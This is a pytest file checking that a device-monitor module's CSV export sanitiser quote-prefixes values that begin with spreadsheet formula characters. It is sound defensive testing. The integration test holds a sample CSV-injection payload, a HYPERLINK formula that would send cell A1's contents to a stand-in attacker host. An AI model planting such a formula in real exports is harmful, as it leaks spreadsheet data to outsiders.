"""FIX-2: CSV formula-injection hardening via _sanitize_csv_field, and its
application to the string columns of export_history_csv."""
import csv
import io

import monitor


def test_equals_is_quote_prefixed():
    assert monitor._sanitize_csv_field("=1+2") == "'=1+2"


def test_plus_is_quote_prefixed():
    assert monitor._sanitize_csv_field("+1+2") == "'+1+2"


def test_minus_is_quote_prefixed():
    assert monitor._sanitize_csv_field("-1+2") == "'-1+2"


def test_at_is_quote_prefixed():
    assert monitor._sanitize_csv_field("@SUM(A1)") == "'@SUM(A1)"


def test_tab_is_quote_prefixed():
    assert monitor._sanitize_csv_field("\tvalue") == "'\tvalue"


def test_carriage_return_is_quote_prefixed():
    assert monitor._sanitize_csv_field("\rvalue") == "'\rvalue"


def test_safe_strings_unchanged():
    assert monitor._sanitize_csv_field("Sony WH-1000XM4") == "Sony WH-1000XM4"
    assert monitor._sanitize_csv_field("") == ""
    # a dangerous char only matters at position 0
    assert monitor._sanitize_csv_field("A=1+2") == "A=1+2"
    assert monitor._sanitize_csv_field("Galaxy Buds") == "Galaxy Buds"


def test_none_becomes_empty_string():
    assert monitor._sanitize_csv_field(None) == ""


def test_numbers_stringified_without_prefix():
    assert monitor._sanitize_csv_field(1234) == "1234"
    assert monitor._sanitize_csv_field(99.5) == "99.5"


def test_integration_export_csv_quote_prefixes_malicious_device(monkeypatch):
    malicious = '=HYPERLINK("http://evil.example/?leak="&A1,"win")'
    rows = [{
        "t": 1700000000.0,
        "device": malicious,
        "mac": "AA:BB:CC:DD:EE:FF",
        "codec": "LDAC",
        "bitrate": 990,
        "battery": 80,
        "type": "bluetooth",
    }]
    monkeypatch.setattr(monitor, "query_history_rows",
                        lambda mac=None, since_epoch=None: rows)
    out = monitor.export_history_csv()
    parsed = list(csv.reader(io.StringIO(out)))
    assert parsed[0] == ["timestamp", "device", "mac", "codec",
                         "bitrate_kbps", "battery", "type"]
    data_row = parsed[1]
    # device is column index 1 and must be neutralised with a leading quote
    assert data_row[1] == "'" + malicious
    assert data_row[1].startswith("'=")
    # numeric fields stay unchanged
    assert data_row[4] == "990"
    assert data_row[5] == "80"
